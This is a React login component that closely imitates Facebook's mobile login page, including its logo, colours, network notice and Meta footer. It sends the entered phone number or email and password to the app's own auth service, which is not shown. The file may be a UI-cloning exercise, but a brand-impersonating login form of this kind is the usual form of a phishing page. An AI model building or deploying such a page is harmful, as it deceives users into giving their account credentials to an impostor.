import { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { Eye, EyeOff, Info } from "lucide-react";
import { authService } from "../../services/authService";

export default function Login() {
  const navigate = useNavigate();

  const [form, setForm] = useState({
    phone: "",
    password: "",
  });

  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [attempted, setAttempted] = useState(false);

  function handleChange(event) {
    const { name, value } = event.target;

    setForm((current) => ({
      ...current,
      [name]: value,
    }));

    setError("");
    setAttempted(false);
  }

  async function handleSubmit(event) {
    event.preventDefault();

    setError("");
    setAttempted(true);

    const phone = form.phone.trim();
    const password = form.password;

    if (!phone) {
      setError("Please enter your mobile number or email.");
      return;
    }

    if (!password || password.length < 8) {
      setError("Your password must contain at least 8 characters.");
      return;
    }

    setLoading(true);

    try {
      await authService.login({
        phone,
        password,
      });

      navigate("/dashboard", { replace: true });
    } catch (err) {
      setError(
        err.message || "Unable to continue. Please try again."
      );
    } finally {
      setLoading(false);
    }
  }

  return (
    <main className="min-h-screen w-full bg-[#18191a] text-[#e4e6eb] flex flex-col justify-between px-4 py-6 select-none">
      
      {/* Top Header / Language Switcher */}
      <div className="flex flex-col items-center w-full max-w-sm mx-auto pt-2">
        <button
          type="button"
          className="flex items-center gap-1.5 text-xs text-[#b0b3b8] hover:text-white transition py-1"
        >
          <span>English (US)</span>
          <span className="text-[10px]">▼</span>
        </button>

        {/* Central Circular Facebook Logo */}
        <div className="my-8 flex h-[72px] w-[72px] items-center justify-center rounded-full bg-[#0866ff] shadow-lg">
          <span className="text-[44px] font-black text-white leading-none pt-1">
            f
          </span>
        </div>
      </div>

      {/* Main Form Container */}
      <div className="w-full max-w-sm mx-auto flex-1 flex flex-col">
        
        {/* Network Info Notice */}
        <div className="mb-6 text-[13px] text-[#b0b3b8] leading-relaxed text-center px-2">
          Facebook requests and receives your phone number from your mobile network.{" "}
          <Link to="#" className="text-[#3982ff] font-medium hover:underline">
            Change Settings
          </Link>
        </div>

        {/* Error Notification */}
        {error && (
          <div
            role="alert"
            className="mb-4 rounded-xl border border-red-500/30 bg-red-500/10 px-4 py-3 text-xs text-red-300 text-center"
          >
            {error}
          </div>
        )}

        {attempted && !error && loading && (
          <p className="mb-4 text-xs text-gray-400 text-center" role="status">
            Checking your account...
          </p>
        )}

        <form onSubmit={handleSubmit} className="space-y-3.5">
          
          {/* Mobile Number or Email Field */}
          <div className="relative rounded-xl bg-[#242526] border border-[#393a3b] focus-within:border-[#0866ff] transition">
            <input
              id="phone"
              name="phone"
              type="text"
              autoComplete="username"
              required
              value={form.phone}
              onChange={handleChange}
              placeholder="Mobile number or email"
              className="w-full bg-transparent px-4 py-3.5 text-sm text-white outline-none placeholder:text-[#8a8d91]"
            />
            <div className="absolute right-3.5 top-1/2 -translate-y-1/2 text-[#8a8d91]">
              <Info size={18} />
            </div>
          </div>

          {/* Password Field */}
          <div className="relative rounded-xl bg-[#242526] border border-[#393a3b] focus-within:border-[#0866ff] transition">
            <input
              id="password"
              name="password"
              type={showPassword ? "text" : "password"}
              autoComplete="current-password"
              minLength={8}
              required
              value={form.password}
              onChange={handleChange}
              placeholder="Password"
              className="w-full bg-transparent px-4 py-3.5 pr-11 text-sm text-white outline-none placeholder:text-[#8a8d91]"
            />

            <button
              type="button"
              onClick={() => setShowPassword((visible) => !visible)}
              aria-label={showPassword ? "Hide password" : "Show password"}
              className="absolute right-3.5 top-1/2 -translate-y-1/2 text-[#8a8d91] hover:text-white transition"
            >
              {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
            </button>
          </div>

          {/* Log In Button */}
          <button
            type="submit"
            disabled={loading}
            className="w-full mt-2 rounded-full bg-[#0866ff] px-4 py-3.5 text-sm font-semibold text-white transition hover:bg-[#1877f2] disabled:cursor-not-allowed disabled:opacity-60 shadow-md"
          >
            {loading ? "Please wait..." : "Log in"}
          </button>
        </form>

        {/* Forgot Password Link */}
        <div className="mt-4 text-center">
          <Link
            to="/forgot-password"
            className="text-xs font-semibold text-[#e4e6eb] hover:underline"
          >
            Forgot password?
          </Link>
        </div>
      </div>

      {/* Footer / Create Account & Meta Branding */}
      <div className="w-full max-w-sm mx-auto pt-8 pb-4 space-y-4 text-center">
        <Link
          to="/register"
          className="flex w-full items-center justify-center rounded-full border border-[#393a3b] bg-transparent px-4 py-3 text-xs font-semibold text-[#0866ff] hover:bg-white/5 transition"
        >
          Create new account
        </Link>

        {/* Meta Logo Footer */}
        <div className="flex items-center justify-center gap-1.5 pt-2 text-xs font-bold tracking-widest text-[#8a8d91]">
          <span>∞</span>
          <span>Meta</span>
        </div>
      </div>

    </main>
  );
}